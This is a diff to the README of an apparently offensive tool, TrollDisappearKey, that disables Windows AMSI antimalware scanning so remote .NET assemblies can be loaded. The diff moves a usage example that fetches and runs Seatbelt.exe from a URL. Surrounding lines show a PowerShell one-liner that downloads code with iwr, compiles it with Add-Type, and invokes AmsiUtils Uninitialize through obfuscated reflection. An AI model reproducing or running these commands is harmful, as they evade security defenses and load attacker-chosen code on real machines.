@@ -28,6 +28,10 @@ This breaks the provider dlls loading process and we are able to assembly load a
 ```
 TrollDisappearKey.exe <URL TO .EXE ASSEMBLY> <ARGUMENT1,ARGUMENT2>
 ```
+## Example
+```
+TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe" "AMSIProviders"
+```
 
 ## .powershell Usage (does not require admin)
 
@@ -40,11 +44,6 @@ $code = (iwr https://raw.githubusercontent.com/cybersectroll/TrollDisappearKey/r
 Add-Type $code
 [TrollDisappearKeyPS]::DisappearKey()
 ([Ref].Assembly.GetType([System.String]::Join("", "S", "y", "s", "t", "e", "m", ".", "M", "a", "n", "a", "g", "e", "m", "e", "n", "t", ".", "A", "u", "t", "o", "m", "a", "t", "i", "o", "n", ".", "A", "m", "s", "i", "U", "t", "i", "l", "s")).GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize).Invoke($object,$null)
-```
-
-## Example
-```
-TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe" "AMSIProviders"
 ```
 
 ## Features
